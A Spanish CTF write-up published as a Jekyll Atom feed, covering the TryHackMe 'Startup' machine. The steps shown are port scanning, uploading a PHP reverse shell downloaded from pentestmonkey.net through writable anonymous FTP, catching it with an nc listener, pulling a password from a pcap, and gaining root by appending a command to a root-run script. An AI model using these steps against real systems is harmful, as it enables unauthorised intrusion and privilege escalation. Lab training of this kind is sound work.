@@ -1,0 +1,180 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-09-18T13:14:00+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">[+]noname[+]</title><subtitle>Ciberseguridad, CTFs...</subtitle><author><name>0x-noname</name><email>0x-noname@protonmail.com</email><uri>https://0x-noname.medium.com/</uri></author><entry><title type="html">Startup - Try Hack Me</title><link href="http://localhost:4000/thm-startup/" rel="alternate" type="text/html" title="Startup - Try Hack Me" /><published>2021-09-18T00:00:00+02:00</published><updated>2021-09-18T00:00:00+02:00</updated><id>http://localhost:4000/thm-startup</id><content type="html" xml:base="http://localhost:4000/thm-startup/">&lt;h2 id=&quot;linux--1010186208&quot;&gt;Linux / 10.10.186.208&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm-writeup-startup/spicy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;startup&quot;&gt;Startup&lt;/h1&gt;
+&lt;h3 id=&quot;abusar-de-las-vulnerabilidades-tradicionales-a-través-de-medios-no-tradidcionales&quot;&gt;Abusar de las vulnerabilidades tradicionales a través de medios no tradidcionales.&lt;/h3&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos-abiertos&quot;&gt;Escaneo de puertos abiertos&lt;/h3&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap -p- --open -T5 -v -n 10.10.186.208 -oG puertos
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;escaneo-de-servicios&quot;&gt;Escaneo de servicios&lt;/h3&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap -sC -sV -p 21,22,80 10.10.186.208 -oN servicios
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
+| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
+|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.9.154.249
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Nos descargamos notice.txt y important.jpg… pero no obtenemos nada que sea de utilidad.&lt;/p&gt;
+
+&lt;p&gt;Al visitar la web vemos el siguiente mensaje:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;No spice here!
+Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. BTW if you’re a web developer, contact us. Otherwise, don’t you worry. We’ll be online shortly!
+Dev Team&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h3&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -c -t 100 --hc=404 -w /opt/w/common.txt http://10.10.186.208/FUZZ`
+/files
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Navegamos hasta el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/file&lt;/code&gt; y vemos los siguientes archivos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm-writeup-startup/files.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Són los mismos archivos que hay en el servidor ftp, en la carpeta ftp tenemos permisos de lectura escritura y ejecución.
+No descargamos una reverse shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Descomprimimos nuestra shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ tar xzvf php-reverse-shell-1.0.tar.gz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Configuramos nuestra shell con nuestra ip de atacante.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm-writeup-startup/reverseconf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos conectamos de nuevo al FTP, nos vamos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/ftp&lt;/code&gt; y subimos el fichero.php.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;put php-reverse-shell.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos vamos al navegador web al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/files/ftp&lt;/code&gt; y nos aparace nuestra shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm-writeup-startup/php-reverse.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ponemos un netcat a la escucha para obtener nuestra querida shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc -lvnp 1234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Volvemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/files/ftp&lt;/code&gt; de la página web, hacemos click en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt; y nos devolverá una shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm-writeup-startup/www-data.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;tratamiento-tty&quot;&gt;Tratamiento TTY&lt;/h3&gt;
+
+&lt;p&gt;Configuramos nuestra shell para tener una terminal interactiva y funcional.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;script /dev/null -c bash
+control+z
+stty raw -echo;fg
+reset
+xterm
+export TERM=xterm
+export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;user-pivoting&quot;&gt;User Pivoting&lt;/h3&gt;
+
+&lt;p&gt;Lanzamos un ls -la y vemos un archivo “recipe.txt” este nos dice el ingrediente secreto “love” que necesitamos para la web de THM y luego tenemos
+un directorio llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/incident&lt;/code&gt; dentro un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;suspicious.pcapng&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Lo descargamos y lo analizamos con wireshark, filtramos por http, seguimos el flujo tcp y encontraremos un login fallido con el user www-data y una contraseña.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm-writeup-startup/pcapPasswd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lennie: c4ntg3t3n0ughsp1c3&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su lennie&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Probamos la passwd con el usuario lennie y ahora ya podemos leer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Usamos cat para leer el user.txt: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat user.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;THM{03cXXXXXXXXXXXXXXXXXXXXXXXXXXe79}&lt;/p&gt;
+
+&lt;h3 id=&quot;privesc&quot;&gt;Privesc&lt;/h3&gt;
+&lt;p&gt;Desde el home de lennie lanzamos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -laR&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./Documents:
+-rw-r--r-- 1 root   root    139 Nov 12  2020 concern.txt
+-rw-r--r-- 1 root   root     47 Nov 12  2020 list.txt
+-rw-r--r-- 1 root   root    101 Nov 12  2020 note.txt
+
+./scripts:
+-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
+-rw-r--r-- 1 root   root      1 Aug 19 14:23 startup_list.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;fichero-plannersh&quot;&gt;Fichero planner.sh&lt;/h3&gt;
+&lt;p&gt;Veamos que contiene: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat planner.sh&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LIST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;fichero&quot;&gt;Fichero&lt;/h3&gt;
+&lt;p&gt;Miramos el contenido del siguiente archivo: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /etc/print.sh&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Done!&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;fichero-startup_listtxt&quot;&gt;Fichero startup_list.txt&lt;/h3&gt;
+&lt;p&gt;Fichero vacío&lt;/p&gt;
+
+&lt;h3 id=&quot;fichero-concerntxt&quot;&gt;Fichero concern.txt&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat concern.txt&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;I got banned from your library for moving the “C programming language” book into the horror section. Is there a way I can appeal? –Lennie
+Me han expulsado de su biblioteca por mover el libro “Lenguaje de programación C” a la sección de terror. ¿Hay alguna forma de apelar? -Lennie&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;fichero-listtxt&quot;&gt;Fichero list.txt&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat list.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shoppinglist: Cyberpunk 2077 | Milk | Dog food&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;fichero-notetxt&quot;&gt;Fichero note.txt&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat note.txt &lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
+Recordatorios: Habla con Inclinant sobre nuestra falta de seguridad, contrata a un desarrollador web, borra los registros de incidencias.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;El archivo print.sh tiene permisos de escritura&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo 'cat /root/root.txt &amp;gt; /home/lennie/root.txt' &amp;gt;&amp;gt; /etc/print.sh&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Comprobamos que el fichero print.sh se ha modificado&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /etc/print.sh&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Done!&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /home/lennie/root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Esperamos unos segundos y nos aparecerá el fichero root.txt en el home de lennie&lt;/p&gt;
+
+&lt;p&gt;Lanzamos un: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat root.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;THM{f96XXXXXXXXXXXXXXXXXXXXXXXXX76d}&lt;/p&gt;</content><author><name>0x-noname</name><email>0x-noname@protonmail.com</email><uri>https://0x-noname.medium.com/</uri></author><category term="tryhackme" /><category term="reverse-shell" /><category term="bash" /><category term="tryhackme" /><category term="linux" /><summary type="html">Estamos frente a una máquina Linux, tenemos acceso al servicio FTP con el usuario anonymous, podremos subir una reverse-shell al servidor FTP porque tenemos permisos de escritura, lectura y ejecución para si obtener la intrusión de la máquina, una vez dentro tendrémos que realizar un user pivoting para posteriormente obtener la flag de root mediante un fichero en bash.</summary></entry></feed>
